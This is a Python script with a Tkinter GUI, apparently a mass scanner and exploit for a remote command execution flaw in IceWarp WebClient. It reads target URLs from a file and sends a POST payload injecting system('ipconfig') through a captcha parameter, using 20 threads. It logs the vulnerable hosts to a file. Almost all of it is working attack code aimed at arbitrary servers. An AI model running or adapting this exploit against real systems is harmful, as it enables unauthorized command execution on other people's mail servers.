import requests
import tkinter as tk
from tkinter import scrolledtext
from concurrent.futures import ThreadPoolExecutor
from ttkbootstrap.constants import *
def iceWarp_webClient_rce_exp(url):
    poc = r"""/webmail/basic/"""
    url = url + poc
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie": "use_cookies=1"
    }
    data = r"""_dlg[captcha][target]=system(\'ipconfig\')\ """
    try:
        res = requests.post(url, headers=headers,data=data,verify=False,timeout=3)
        if "Windows" in res.text:
            iceWarp_webClient_rce_text.insert(END,"【！！！！！！】存在漏洞的url：" + url + "\n")
            iceWarp_webClient_rce_text.see(END)
            with open ("存在IceWarp WebClient远程命令执行漏洞的url.txt", 'a') as f:
                f.write(url + "\n")
        else:
            iceWarp_webClient_rce_text.insert(END,"【×】不存在漏洞的url：" + url + "\n")
            iceWarp_webClient_rce_text.see(END)
    except Exception as err:
        iceWarp_webClient_rce_text.insert(END, "【×】目标请求失败，报错内容：" + str(err) + "\n")
        iceWarp_webClient_rce_text.see(END)
def get_iceWarp_webClient_rce_addr():
    with open("修正后的url.txt","r") as f:
        for address in f.readlines():
            address = address.strip()
            yield address
def iceWarp_webClient_rce_gui():
    iceWarp_webClient_rce = tk.Tk()
    iceWarp_webClient_rce.geometry("910x450")
    iceWarp_webClient_rce.title("IceWarp WebClient远程命令执行漏洞一把梭")
    iceWarp_webClient_rce.resizable(0, 0)
    iceWarp_webClient_rce.iconbitmap('logo.ico')
    global iceWarp_webClient_rce_text
    iceWarp_webClient_rce_text = scrolledtext.ScrolledText(iceWarp_webClient_rce,width=123, height=25)
    iceWarp_webClient_rce_text.grid(row=0, column=0, padx=10, pady=10)
    iceWarp_webClient_rce_text.see(END)
    addrs = get_iceWarp_webClient_rce_addr()
    max_thread_num = 20
    executor = ThreadPoolExecutor(max_workers=max_thread_num)
    for addr in addrs:
        future = executor.submit(iceWarp_webClient_rce_exp, addr)
    iceWarp_webClient_rce.mainloop()